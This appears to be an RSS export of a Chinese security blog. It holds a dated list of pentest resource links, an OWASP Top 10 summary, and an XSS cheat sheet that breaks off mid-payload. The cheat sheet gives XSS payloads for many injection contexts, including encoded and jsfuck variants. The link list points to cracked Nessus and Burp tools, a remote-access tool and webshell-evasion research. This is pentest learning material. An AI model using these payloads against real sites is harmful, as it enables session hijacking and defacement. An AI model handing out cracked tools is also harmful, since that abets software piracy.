href="https://pan.baidu.com/s/1H_Yx1WpDuYan27zQiWGsHQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1H_Yx1WpDuYan27zQiWGsHQ</a> 提取码:8r3t</p><p>鸟哥的Linux私房菜 基础学习篇(第三版)</p><p>链接：<a href="https://pan.baidu.com/s/15CNv7WGE5d5vJxgCG2_r-A" target="_blank" rel="noopener">https://pan.baidu.com/s/15CNv7WGE5d5vJxgCG2_r-A</a> 提取码：htz6</p><p>网络安全学习方法论之体系的重要性<br><a href="https://mp.weixin.qq.com/s/yXA4BRbMfJNPQ68_-Nme6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/yXA4BRbMfJNPQ68_-Nme6g</a></p><p>7.10和7.11</p><p>Cisp学习资料</p><p>链接:<a href="https://pan.baidu.com/s/1eknPCL0eNf3OPEeHlj3Mgg" target="_blank" rel="noopener">https://pan.baidu.com/s/1eknPCL0eNf3OPEeHlj3Mgg</a> 提取码:nb6e </p><p>漏洞思路</p><p><a href="https://websec.readthedocs.io/zh/latest/info/misc.html" target="_blank" rel="noopener">https://websec.readthedocs.io/zh/latest/info/misc.html</a></p><p>Discuz ML! V3.X 代码注入漏洞</p><p><a href="https://mp.weixin.qq.com/s/5Zl3Jve4eblNIXh30t469w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5Zl3Jve4eblNIXh30t469w</a></p><p>python黑客教程</p><p><a href="http://www.primalsecurity.net/tutorials/python-tutorials/" target="_blank" rel="noopener">http://www.primalsecurity.net/tutorials/python-tutorials/</a></p><p>实战演练图 <a href="https://images.zsxq.com/FqukAxZEC1I91Efx25k8WzDhmgTT?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&amp;e=1906272000&amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Zf9IqcFNM75dh7VqhVJXd4-HZ6M=" target="_blank" rel="noopener">https://images.zsxq.com/FqukAxZEC1I91Efx25k8WzDhmgTT?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&amp;e=1906272000&amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Zf9IqcFNM75dh7VqhVJXd4-HZ6M=</a></p><p>7.8日和7.9一起更新：</p><p>漏洞挖掘中常见的源码泄露</p><p><a href="https://zhuanlan.zhihu.com/p/27014481" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/27014481</a></p><p>Nessus Pro版本破解教程细化版，可安装在官方支持的任意操作系统。</p><p><a href="https://pan.baidu.com/s/1obRwdWaMBLLgS0F8hjsNVQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1obRwdWaMBLLgS0F8hjsNVQ</a> 提取码：6vq6</p><p>个关于数字隐私搜集、保护、清理集一体的方案</p><p><a href="https://github.com/No-Github/Digital-Privacy" target="_blank" rel="noopener">https://github.com/No-Github/Digital-Privacy</a></p><p>muddywater(污水) APT组织针对塔吉克斯坦这一个月来的活动分析 里面涉及到了一些红队可以用到的思路,大报告推荐一读</p><p><a href="https://bbs.pediy.com/thread-252477.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252477.htm</a></p><p>在线CMS识别<a href="https://whatcms.org/" target="_blank" rel="noopener">https://whatcms.org/</a></p><p>burpsuite插件<a href="https://github.com/bit4woo/knife" target="_blank" rel="noopener">https://github.com/bit4woo/knife</a></p><p>西门吹雪的个人网盘</p><p><a href="http://pan.ximcx.cn/home/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7" target="_blank" rel="noopener">http://pan.ximcx.cn/home/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7</a></p><p>7.7日更新：</p><p>感谢来自星球小伙伴的分享</p><p>boy-hack(也叫作小草窝)师傅的博客</p><p><a href="https://x.hacking8.com/" target="_blank" rel="noopener">https://x.hacking8.com/</a></p><p>PHP一句话木马免杀方法的研究</p><p><a href="https://saucer-man.com/information_security/248.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/248.html</a></p><p>rivir师傅多年来对代码审计的理解与总结，对PHP一些危险函数深入分析及在P牛博客和代码审计圈的收获</p><p><a href="https://github.com/jiangsir404/Audit-Learning" target="_blank" rel="noopener">https://github.com/jiangsir404/Audit-Learning</a></p><p>rivir师傅对一些大型CMS漏洞的复现研究文章,同时附带漏洞exp</p><p><a href="https://github.com/jiangsir404/PHP-code-audit" target="_blank" rel="noopener">https://github.com/jiangsir404/PHP-code-audit</a></p><p>童话师傅的博客文章， 主要讲授OCSP,代码审计,物联网安全等 还挺不错</p><p><a href="https://tonghuaroot.com/" target="_blank" rel="noopener">https://tonghuaroot.com/</a></p><p>来自于Smil1e师傅总结的github项目</p><p><a href="https://github.com/Smi1eSEC/Web-Security-Note" target="_blank" rel="noopener">https://github.com/Smi1eSEC/Web-Security-Note</a></p><p>来自于现在研究于RedTeam的Wing师傅上的github项目 项目简介:(仍旧照搬原项目简介,逃)This project collects public vulnerabilities and articles</p><p><a href="https://github.com/RedTeamWing/Hacking-Skills" target="_blank" rel="noopener">https://github.com/RedTeamWing/Hacking-Skills</a></p><p>7.6日更新：</p><p>struts2的高危漏洞和资料(11月24日）</p><p> 链接: <a href="https://pan.baidu.com/s/1SseNMQBfn-SYi9IEXff_AA" target="_blank" rel="noopener">https://pan.baidu.com/s/1SseNMQBfn-SYi9IEXff_AA</a> 提取码: 1u4b </p><p>安卓开发一套</p><p>链接：<a href="https://pan.baidu.com/s/1reu7X9o5JkEm34Zf0ml0wA" target="_blank" rel="noopener">https://pan.baidu.com/s/1reu7X9o5JkEm34Zf0ml0wA</a> 提取码：e3qn</p><p>Rapid7-2019-Q1 季度威胁报告</p><p><a href="https://www.rapid7.com/research/report/2019-q1-threat-report/" target="_blank" rel="noopener">https://www.rapid7.com/research/report/2019-q1-threat-report/</a></p><p>值得一看，讲得很生动，从基础到深入，想要深入网络协议的小伙伴可以下载看看。 链接：<a href="https://pan.baidu.com/s/1w-B7qoOQ5P2EtRqj5eFaWA" target="_blank" rel="noopener">https://pan.baidu.com/s/1w-B7qoOQ5P2EtRqj5eFaWA</a> 提取码：2126</p><p>利用eventvwr com劫持的cs模块，非常不错的样例</p><p><a href="https://github.com/mdsecresearch/Publications/blob/master/tools/redteam/cna/eventvwr.cna" target="_blank" rel="noopener">https://github.com/mdsecresearch/Publications/blob/master/tools/redteam/cna/eventvwr.cna</a></p><p>Xposed框架模块 – RootCloak（Root隐藏） Open source module for Xposed Framework that hides root from specific apps</p><p><a href="https://github.com/devadvance/rootcloak" target="_blank" rel="noopener">https://github.com/devadvance/rootcloak</a></p><p>7.4和7.5学校停电，我日子十分卑微，明天更新。</p><p>7.3日更新：</p><p>企业级账户收集 <a href="http://veryvp.com/" target="_blank" rel="noopener">http://veryvp.com/</a></p><p>Vxscan是用python3写的综合扫描工具，主要用来敏感文件探测(目录扫描与js泄露)，WAF/CDN识别，端口扫描，指纹/服务识别，操作系统识别，弱口令探测，POC扫描，SQL注入，绕过CDN，查询旁站等功能。</p><p><a href="https://github.com/al0ne/Vxscan" target="_blank" rel="noopener">https://github.com/al0ne/Vxscan</a></p><p>有关SSRF</p><p><a href="https://github.com/cujanovic/SSRF-Testing" target="_blank" rel="noopener">https://github.com/cujanovic/SSRF-Testing</a></p><p>nessus20190703离线更新插件 MD5：2C21AB743A45BC4364A88F4A80CCAFC7 链接: <a href="https://pan.baidu.com/s/1twsoi6IDl7b6pU5NK6wXkQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1twsoi6IDl7b6pU5NK6wXkQ</a> 提取码: riu7</p><p>远控（自查后门） 链接：<a href="https://pan.baidu.com/s/1978xA2mlB3nwAc7ii44Mmw" target="_blank" rel="noopener">https://pan.baidu.com/s/1978xA2mlB3nwAc7ii44Mmw</a> 提取码：rqyG</p><p>CISSP思维导图链接：<a href="https://pan.baidu.com/s/1Uh_HKe4OJrgurOUqSA2SIQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1Uh_HKe4OJrgurOUqSA2SIQ</a> 提取码：w6ss</p><p>CISSP 讲解视频 链接:<a href="https://pan.baidu.com/s/1kPXEhpYE_GLLrw4rut9mfg" target="_blank" rel="noopener">https://pan.baidu.com/s/1kPXEhpYE_GLLrw4rut9mfg</a> 提取码:b2f4 </p><p>7.2考试没有更新.。</p><p>见谅</p><p>7.1日更新：</p><p>DEFCON培训的视频，英文的，有字幕<br>复制这段内容后打开百度网盘手机App，操作更方便哦 链接:<a href="https://pan.baidu.com/s/1PlFWz2akQd980wzwg1ppjw" target="_blank" rel="noopener">https://pan.baidu.com/s/1PlFWz2akQd980wzwg1ppjw</a> 提取码:9y51</p><p>Excel 曝出 Power Query 安全漏洞，1.2 亿用户易受远程 DDE 攻击<br><a href="https://mp.weixin.qq.com/s/5ViO_5Ala5JSke8FNjwKoA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5ViO_5Ala5JSke8FNjwKoA</a></p><p>维持访问-利用快捷方式</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5NTk1MjQ3Mg==&amp;mid=2247483692&amp;idx=1&amp;sn=4013f15a249d08d2b80d09d9883baed6&amp;chksm=fe6b571bc91cde0d7479bcc1dcdb993e956b04a22f23fcaa132f3bc61a4ebb8acdd5e5181670&amp;xtrack=1&amp;scene=0&amp;subscene=92&amp;sessionid=1561906147&amp;clicktime=1561906178&amp;ascene=7&amp;devicetype=android-27&amp;version=2700043c&amp;nettype=WIFI&amp;abtest_cookie=BQABAAoACwASABMAFQAFACOXHgBWmR4Az5keAPiZHgANmh4AAAA%3D&amp;lang=zh_CN&amp;pass_ticket=%2BLR%2Bwr1osMNuE5W%2F0L%2BbTZGCMgR%2BCyvnniqLl8KH2TNKs6WXy1a%2BGS9wDJQet6iL&amp;wx_header=1" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU5NTk1MjQ3Mg==&amp;mid=2247483692&amp;idx=1&amp;sn=4013f15a249d08d2b80d09d9883baed6&amp;chksm=fe6b571bc91cde0d7479bcc1dcdb993e956b04a22f23fcaa132f3bc61a4ebb8acdd5e5181670&amp;xtrack=1&amp;scene=0&amp;subscene=92&amp;sessionid=1561906147&amp;clicktime=1561906178&amp;ascene=7&amp;devicetype=android-27&amp;version=2700043c&amp;nettype=WIFI&amp;abtest_cookie=BQABAAoACwASABMAFQAFACOXHgBWmR4Az5keAPiZHgANmh4AAAA%3D&amp;lang=zh_CN&amp;pass_ticket=%2BLR%2Bwr1osMNuE5W%2F0L%2BbTZGCMgR%2BCyvnniqLl8KH2TNKs6WXy1a%2BGS9wDJQet6iL&amp;wx_header=1</a></p><p>平时经常用到CTF工具网站，其实不只CTF能用</p><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">https://www.ctftools.com/down/</a></p><p>6.30日最新：</p><p>BurpSuite收集：包括不限于 Burp 文章、破解版、插件、汉化等相关教程</p><p><a href="https://github.com/Mr-xn/BurpSuite-collections" target="_blank" rel="noopener">https://github.com/Mr-xn/BurpSuite-collections</a></p><p>cve-2019-0708分析文章</p><p><a href="https://mp.weixin.qq.com/s/scOuWn0C-PU_CPrzm70ACQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/scOuWn0C-PU_CPrzm70ACQ</a></p><p>隐藏进程教程：</p><p><a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a></p><p>6.29日最新：</p><p>米斯特安全团队开源项目|PoCBox  微信文章<a href="https://mp.weixin.qq.com/s/ckkZ7uq6Cygn-5J6bVKRmg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ckkZ7uq6Cygn-5J6bVKRmg</a><br>项目地址：<a href="https://github.com/gh0stkey/PoCBox" target="_blank" rel="noopener">https://github.com/gh0stkey/PoCBox</a></p><p>匿名信息保护洋葱路由：  <a href="https://github.com/leitbogioro/Fuck_Aliyun" target="_blank" rel="noopener">https://github.com/leitbogioro/Fuck_Aliyun</a></p><p>关闭阿里云监控服务 ：<a href="https://github.com/Nummer/Destroy-Windows-10-Spying" target="_blank" rel="noopener">https://github.com/Nummer/Destroy-Windows-10-Spying</a></p><p>在线自服务于工具：<a href="https://github.com/Kickball/awesome-selfhosted" target="_blank" rel="noopener">https://github.com/Kickball/awesome-selfhosted</a></p><p>awesome系列之自服务应用：<a href="https://github.com/littlecodersh/itchat" target="_blank" rel="noopener">https://github.com/littlecodersh/itchat</a></p><p>威胁情报分析：<a href="https://www.databases.today/" target="_blank" rel="noopener">https://www.databases.today/</a> <a href="https://publicdbhost.dmca.gripe/" target="_blank" rel="noopener">https://publicdbhost.dmca.gripe/</a> <a href="http://www.wttech.org/" target="_blank" rel="noopener">http://www.wttech.org/</a></p><p>敏感信息泄露发现：<a href="https://github.com/Yelp/detect-secrets" target="_blank" rel="noopener">https://github.com/Yelp/detect-secrets</a></p><p>PY 防止代码中的密码等相关敏感信息被提交到代码库中，可以保证在安全性的同时不会给开发者的生产力带来任何影响</p><p><a href="https://github.com/Acceis/leakScraper" target="_blank" rel="noopener">https://github.com/Acceis/leakScraper</a></p><p>安全教程：sql注入详细教程 链接：<a href="https://pan.baidu.com/s/1NRQaaAHr2-ClEW7ICl8KiQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1NRQaaAHr2-ClEW7ICl8KiQ</a> 提取码：A0i6 复制这段内容后打开百度网盘手机App，操作更方便哦</p><p>写给小白のDeepWeb　Gudie</p><p><a href="http://129.28.191.36/" target="_blank" rel="noopener">http://129.28.191.36/</a></p><p>0day系列教程 链接：<a href="https://pan.baidu.com/s/1fPtF5kBHxw_U5fVn5wRIEw" target="_blank" rel="noopener">https://pan.baidu.com/s/1fPtF5kBHxw_U5fVn5wRIEw</a> 提取码：we3T 复制这段内容后打开百度网盘手机App，操作更方便哦</p><p>最新文章：总结的Windows 内核漏洞利用学习系列<a href="https://bbs.pediy.com/thread-252310.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252310.htm</a></p><p> web蜜罐内网监测  <a href="https://github.com/cowrie/cowrie" target="_blank" rel="noopener">https://github.com/cowrie/cowrie</a></p><p>ParrotSec中文社区qq机器人,实现Discourse动态推送QQ群和常用漏洞端口扫描功能</p><p><a href="https://github.com/ParrotSec-CN/ParrotSecCN_Community_QQbot" target="_blank" rel="noopener">https://github.com/ParrotSec-CN/ParrotSecCN_Community_QQbot</a></p><p>chrome插件、自动查找xss漏洞（需要翻墙）<a href="https://chrome.google.com/webstore/detail/xsssniper/pnhekakhikkhloodcedfcmfpjddcagpi?hl=zh-CN" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/xsssniper/pnhekakhikkhloodcedfcmfpjddcagpi?hl=zh-CN</a></p><p>渗透 超全面的渗透资料? 包含：0day，xss，sql注入，提权</p><p><a href="https://github.com/w1109790800/penetration" target="_blank" rel="noopener">https://github.com/w1109790800/penetration</a></p><p>awvs插件 <a href="https://github.com/PortSwigger" target="_blank" rel="noopener">https://github.com/PortSwigger</a></p><p>metasploit插件 <a href="https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit" target="_blank" rel="noopener">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“owasp top 10”</title>
      <link href="/2020/04/14/owasp-top-10/"/>
      <url>/2020/04/14/owasp-top-10/</url>
      
        <content type="html"><![CDATA[<h2 id="Owasp-Top10介绍"><a href="#Owasp-Top10介绍" class="headerlink" title="Owasp Top10介绍"></a>Owasp Top10介绍</h2><h3 id="什么是OWASP-Top-10"><a href="#什么是OWASP-Top-10" class="headerlink" title="什么是OWASP Top 10"></a>什么是OWASP Top 10</h3><p>OWASP（开放式Web应用程序安全项目）的工具、文档、论坛和全球各地分会都是开放的，对所有致力于改进应用程序安全的人士开放，其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结了Web应用程序最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。</p><h3 id="A1-注入injection"><a href="#A1-注入injection" class="headerlink" title="A1 注入injection"></a>A1 注入injection</h3><pre><code>将不安全的命令作为命令发送给解析器，会产生类似于SQL注入、NoSQL注入、OS注入和LDAP注入(轻量目录访问协议) 的缺陷，攻击者可以构造恶意数据通过注入缺陷的解析器执行没有权限的非预期命令或访问数据。</code></pre><h3 id="A2-失效的身份认证"><a href="#A2-失效的身份认证" class="headerlink" title="A2 失效的身份认证"></a>A2 失效的身份认证</h3><pre><code>通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者暂时或永久的冒充其他用户的身份。</code></pre><h3 id="A3-敏感数据泄露"><a href="#A3-敏感数据泄露" class="headerlink" title="A3 敏感数据泄露"></a>A3 敏感数据泄露</h3><pre><code>这个比较好理解，一般我们的敏感信息包括密码、财务数据、医疗数据等，由于web应用或者API未加密或不正确的保护敏感数据，这些数据极易遭到攻击者利用，攻击者可能使用这些数据来进行一些犯罪行为，因此，未加密的信息极易遭到破坏和利用，我们应该加强对敏感数据的保护，web应用应该在传输过程中数据、存储的数据以及和浏览器的交互时的数据进行加密，保证数据安全。</code></pre><h3 id="A4外部实体-XXE"><a href="#A4外部实体-XXE" class="headerlink" title="A4外部实体(XXE)"></a>A4外部实体(XXE)</h3><pre><code>XXE 全称为XML External Entity attack 即XML(可扩展标记语言) 外部实体注入攻击，早期或配置错误的XML处理器评估了XML文件外部实体引用，攻击者可以利用这个漏洞窃取URI(统一资源标识符)文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</code></pre><h3 id="A5失效的访问控制"><a href="#A5失效的访问控制" class="headerlink" title="A5失效的访问控制"></a>A5失效的访问控制</h3><pre><code>通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用这个漏洞去查看未授权的功能和数据，eg:访问用户的账户、敏感文件、获取和正常用户相同的权限等.</code></pre><h3 id="A6-安全配置错误"><a href="#A6-安全配置错误" class="headerlink" title="A6 安全配置错误"></a>A6 安全配置错误</h3><pre><code>安全配置错误是比较常见的漏洞，由于操作者的不当配置(默认配置，临时配置，开源云存储，http标头配置，以及包含敏感信息的详细错误)，导致攻击者可以利用这些配置获取到更高的权限，安全配置错误可以发生在各个层面，包含平台、web服务器、应用服务器、数据库、架构和代码。</code></pre><h3 id="A7-跨站脚本（xss）"><a href="#A7-跨站脚本（xss）" class="headerlink" title="A7 跨站脚本（xss）"></a>A7 跨站脚本（xss）</h3><pre><code>xss攻击全称为跨站脚本攻击,当应用程序的新网页中包含不受信任的、未经恰当验证、转义的数据或可以使用HTML、JavaScript的浏览器API更新的现有网页时，就会出现xss漏洞，跨站脚本攻击是最普遍的web应用安全漏洞，甚至在某些安全平台都存在xss漏洞。xss会执行攻击者在浏览器中执行的脚本，并劫持用户会话，破坏网站或用户重定向到恶意站点，使用xss还可以执行拒绝服务攻击。</code></pre><h3 id="A8不安全的反序列化"><a href="#A8不安全的反序列化" class="headerlink" title="A8不安全的反序列化"></a>A8不安全的反序列化</h3><pre><code>不安全的反序列化可以导致远程代码执行、重放攻击、注入攻击或特权升级攻击</code></pre><h3 id="A9使用含有已知漏洞的组件"><a href="#A9使用含有已知漏洞的组件" class="headerlink" title="A9使用含有已知漏洞的组件"></a>A9使用含有已知漏洞的组件</h3><pre><code>组件(eg：库、框架或其他软件模块)拥有应用程序相同的权限，如果应用程序中含有已知漏洞，攻击者可以利用漏洞获取数据或接管服务器。同时，使用这些组件会破坏应用程序防御，造成各种攻击产生严重的后果。</code></pre><h3 id="A10-不足的日志记录和监控"><a href="#A10-不足的日志记录和监控" class="headerlink" title="A10 不足的日志记录和监控"></a>A10 不足的日志记录和监控</h3><pre><code>这个和等保有一定的关系，不作介绍，不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性的或攻击更多的系统，以及对数据的不当操作。</code></pre><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><pre><code>大概了解了top 10的相关漏洞，对于漏洞有了一个大概的认识，接下来就是去多实际操作，去熟悉漏洞的相关特性，有助于您更好的了解这些漏洞。</code></pre><p>原文链接：<a href="https://blog.csdn.net/wang_624/article/details/89683571" target="_blank" rel="noopener">https://blog.csdn.net/wang_624/article/details/89683571</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss备忘录</title>
      <link href="/2020/04/04/test/"/>
      <url>/2020/04/04/test/</url>
      
        <content type="html"><![CDATA[<p>前言</p><h2 id="XSS备忘录"><a href="#XSS备忘录" class="headerlink" title="XSS备忘录"></a>XSS备忘录</h2><h2 id="0x00-渗透流程"><a href="#0x00-渗透流程" class="headerlink" title="0x00 渗透流程"></a>0x00 渗透流程</h2><ol><li><p>观察输入输出点，测试waf过滤情况</p><p>简单: “‘<script javascript onload src><a href></a>#$%^ 全面: '";!-=#$%^&{()}<script javascript data onload href src img input><a href></a>alert(String.fromCharCode(88,83,83));prompt(1);confirm(1)</script></p><p>观察输入输出情况，一些特殊字符是否被编码、标签是否被过滤、输出点在标签之间或标签之内</p></li><li><p>依据输出位置进行XSS</p><ul><li><p>标签之间：</p><p>x 模型： <div>[xss]</div> payload： <script>alert(1)</script>或者<img src="1" onerror="alert(1)"> 这些标签有：<a> <p> <img> <body> <button> <var> <div> <object> <input> <select> <keygen> <frameset>  <embed> <svg> <video> <audio>       自带HtmlEncode（转义）功能的标签(RCDATA)，这是插入的javascript不会被执行，除非我们闭合掉它们。<textarea/> <title/> <iframe/> <noscript/> <noframes/> <xmp/> <plaintext/> 其他：<math/>也不行</audio></video></svg></frameset></select></object></div></var></button></body></p><p><textarea></textarea> <title></title> <iframe></iframe> <noscript></noscript> <noframes></noframes> <xmp></xmp> <plaintext></plaintext> 其他：<math></math>也不行</p></a></p></li><li><p>在JS标签内：</p><p>在该位置，空格被过滤，可用/**/代替空格。输出在注释中，通过换行符%0a %0d使其逃逸出来。</p></li></ul><ol><li><p>不在字符串内。</p><p>判断&lt;&gt;/是否被过滤。如果没有，那么直接插入就可以。</p><script>  [output]</script><p>  payload：<script>alert(1)</script></p><ol start="2"><li><p>在字符串中</p><p>此时需要闭合字符串，并保证插入的JS代码符合语法规范。</p><p>如：</p></li></ol><script>Var x="Input";</script><p>input是输出点，我们首先要闭合双引号，才能保证XSS成功。如果我们无法闭合包括字符串的引号（引号被转义），就很难利用，除非存在两个输出点或宽字节。</p><table><thead><tr><th>前者在引号被转义成HTML实体时有效。此外，两个输出点的情况，也需要在某些特殊情况下才能构造。例子可参考[那些年我们一起学XSS</th><th>反斜线复仇记](<a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/4.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/xss-naxienian/content/4.html</a>)</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>  后者，在引号被转义成”时有效。在网页为GBK编码时，存在宽字节问题。</p><blockquote><p>宽字节问题：</p><p>GBK编码第一字节（高字节）的范围为：0x81~0xFE</p><p>GBK编码第二字节（低字节）的范围为：0x40<del>0x7E、0x80</del>0xFE</p><p>\符号的十六进制为0x5C, 刚好处在GBK的低字节中，如果前面有一个高字节（如%c0），那么</p><p>恰好会被组合成一个合法的字符，从而\被吃掉，双引号逃逸出来。</p></blockquote><p>  例子可参考<a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/3.html" target="_blank" rel="noopener">那些年我们一起学XSS|宽字节复仇记</a></p></li></ol></li></ol><p>​        </p><ul><li>输出在HTML属性内</li></ul><ol><li><p>文本属性中</p><p>例如：<code>&lt;input value=&quot;输出&quot;&gt;</code> 、 <code>&lt;img onload=&quot;...[输出]...&quot;&gt;</code> ，再比如 <code>&lt;body style=&quot;...[输出]...&quot;&gt;</code></p><ul><li><p>无引号包裹，直接添加新的事件属性。</p><ul><li><p>有引号包括。首先测试引号是否可用，可用则闭合属性之后添加新的事件属性。</p><p>HTML的属性，如果被进行HTML实体编码(形如’&amp;#x27)，那么HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构造payload。</p><p>当然，也可以闭合属性后，然后再执行脚本。</p></li></ul></li></ul><ol start="2"><li><p>src/href/action/xlink:href/autofocus/content/data 等属性</p><p>直接使用伪协议绕过。</p></li></ol></li></ol><pre><code> javascript 伪协议： &lt;a href=javascript:alert(2)&gt;test&lt;/a&gt;     data 协议执行 javascript： &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;test&lt;/a&gt;(Chrome被拦截，Firefox可以)  urlencode 版本： &lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;(测试未通过) 不使用 href 的另外一种组合来执行 js： &lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt;（均可） 或者：       &lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;1&lt;/a&gt;&lt;/math&gt;(Chrome不可，Firefox可以)</code></pre><p>   如果不行，则测试添加事件进行触发。（首先还是需要闭合）</p><pre><code>  如：`&lt;a href=&quot;test.com&quot; onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;`</code></pre><ol start="3"><li><p>on*事件中</p><p>插入合乎逻辑的JS代码即可。也可以使用伪协议。</p></li></ol><pre><code> 常见事件 ```  onload  onclick    onunload  onchange     onsubmit  onreset     onselect  onblur     onfocus  onabort     onkeydown     onkeypress     onkeyup     ondbclick     onmouseover     onmousemove     onmouseout     onmouseup     onforminput     onformchange     ondrag     ondrop ``` 4. style属性内及css代码之中IE可执行，并且在IE6以上被防御，不适合其他浏览器，基本已死。    style=&quot;width:expression(js代码)&quot;  background-image:url(&#39;javascript:alert(2)&#39;)</code></pre><ul><li><p>输出在meta标签</p><meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"><p>还有一些猥琐的思路，就是通过给http-equiv设置set-cookie，进一步重新设置 cookie 来干一些猥琐的事情。</p></li></ul><h2 id="0x01-具体标签的Payload"><a href="#0x01-具体标签的Payload" class="headerlink" title="0x01 具体标签的Payload"></a>0x01 具体标签的Payload</h2><ol><li><p>a标签</p><ul><li><p>javascript伪协议：</p><a href="javascript:alert(2)" target="_blank" rel="noopener"></a></li><li><p>data协议执行javascript：</p><p>&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;</p></li></ul></li></ol><ul><li><p>urlencode版本：</p><a href="data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E" target="_blank" rel="noopener"></a></li><li><p>不使用href的另外一种组合来执行js：</p><pre><code>&lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt; </code></pre><p>或者：</p><p><math><a xlink:href="javascript:alert(1)"></a></math></p></li></ul><ol start="2"><li><p>script标签</p><ul><li><p>最简单的测试payload：</p><script>alert(1)</script></li><li><p>jsfuck版本：</p><script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script><p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">jsfuck</a></p></li><li><p>各种编码版本：</p></li></ul><p>&lt;script/src=data&colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;</p><script>prompt(-[])</script>//不只是alert。prompt和confirm也可以弹窗   <script>alert(/3/)</script>//可以用"/"来代替单引号和双引号 <script>alert(String.fromCharCode(49))</script> //我们还可以用char  <script>alert(/7/.source)</script> // ".source"不会影响alert(7)的执行  <script>setTimeout('alert(1)',0)</script> //如果输出是在setTimeout里，我们依然可以直接执行alert(1)</li><li><p>button标签</p><ul><li><p>event事件实现js调用：</p><p>&lt;button/onclick=alert(1) &gt;M</p></li><li><p>html5的新姿势：</p><p>需要交互的版本：</p><pre><code></code></pre><form><button formaction="javascript&colon;alert(1)">M```<p>不需要交互的版本：</p><pre><code>&lt;button onfocus=alert(1) autofocus&gt;</code></pre></button></form></li></ul></li><li><p>p标签</p><ul><li><p>如果发现变量输出在p标签中，只要能跳出</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">""<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就足够了：</p><pre><code>&lt;p/onmouseover=javascript:alert(1); &gt;M&lt;/p&gt;</code></pre></li></ul></li><li><p>img标签</p><p>有些姿势是因为浏览器的不同而不能成功执行的。</p><ul><li><p>只在chrome下有效：</p><pre><code>&lt;img src ?itworksonchrome?\/onerror = alert(1)&gt;  //只在chrome下有效&lt;img/src/onerror=alert(1)&gt;  //只在chrome下有效</code></pre></li><li><p>其他：</p><pre><code>&lt;img src=x 